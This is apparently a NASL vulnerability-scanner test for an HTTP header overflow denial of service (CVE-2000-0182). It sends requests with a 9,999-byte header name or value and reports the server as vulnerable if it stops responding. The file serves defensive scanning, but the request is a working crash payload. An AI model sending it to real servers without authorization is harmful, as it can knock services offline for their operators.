# SPDX-FileCopyrightText: 2002 Michel Arboi
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11078");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2000-0182"); # This probably matches
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("HTTP Header Overflow DoS Vulnerability");
  script_category(ACT_DENIAL);
  # All the www_too_long_*.nasl scripts were first declared as
  # ACT_DESTRUCTIVE_ATTACK, but many web servers are vulnerable to them:
  # The web server might be killed by those generic tests before the scanner
  # has a chance to perform known attacks for which a patch exists
  # As ACT_DENIAL are performed one at a time (not in parallel), this reduces
  # the risk of false positives.

  script_copyright("Copyright (C) 2002 Michel Arboi");
  script_family("Gain a shell remotely");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your software or protect it with a filtering reverse proxy.");

  script_tag(name:"summary", value:"It was possible to kill the web server by
  sending an invalid request with a too long header name or value.");

  script_tag(name:"impact", value:"An attacker cracker may exploit this vulnerability to make your web server
  crash continually or even execute arbirtray code on your system.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

# nb: The original VT had the following comment:
# > I don't even know if it crashes any web server...

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:80);
if(http_is_dead(port:port))
  exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

r = http_get(item:"/", port:port);
r = r - string("\r\n\r\n");
r = string(r, "\r\n", "VT-Header: ", crap(9999), "\r\n\r\n");

send(socket:soc, data:r);
r = http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

soc = http_open_socket(port);
if(!soc)
  exit(0);

r = http_get(item:"/", port:port);
r = r - string("\r\n\r\n");
r = string(r, "\r\n", crap(9999), ": A VT was here\r\n\r\n");

send(socket:soc, data:r);
r = http_recv(socket:soc);
http_close_socket(soc);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
